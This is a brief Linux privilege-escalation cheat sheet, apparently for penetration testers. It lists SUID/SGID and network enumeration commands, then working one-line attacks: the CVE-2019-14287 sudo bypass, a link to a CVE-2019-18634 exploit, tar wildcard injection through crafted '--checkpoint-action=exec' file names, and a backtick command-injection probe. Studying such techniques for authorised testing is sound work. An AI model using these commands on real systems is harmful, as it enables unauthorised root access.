# Linux Enumeration

| Command | Summary |
| ---------------------------- | ---------------------------- |
| ```find / -perm -u=s -type f 2>/dev/null``` | Find SUID files |
| ```find / -type f -perm -04000 -ls 2>/dev/null``` | Alternate find for SUID files |
| ```find / -perm -g=s -type f 2>/dev/null``` | Find SGID files |
| ```lsof -i``` | List open files for intrnet and network connections | 
| ```lsof -i :80``` | List open files on TCP 80 | 

| Check | Description |
| ---------------------------- | ---------------------------- |
| Sudo Local Privilege Escalation (CVE-2019-14287) | Sudo versions < 1.8.27 may be vulnerable to LPE, check: ```sudo -u#-1 /bin/bash``` |
| Sudo Buffer Overflow (CVE-2019-18634)| Sudo versions < 1.8.26 may be vulnerable to a buffer overflow, pwfeedback enabled: [GitHub for Code](https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c) |
| Tar wildcard * | Checkpoint syntax ```touch /home/user/--checkpoint=1``` and ```touch /home/user/--checkpoint-action=exec=sh\ shell.sh``` | 
| LFI /api/?something=`whoami` | Try using the ``` ` ``` backtick symbol in addition to quotes ' |
| Shell escapes | Be sure that your terminal window has enough text for pagination, or else the shell escape may not work |
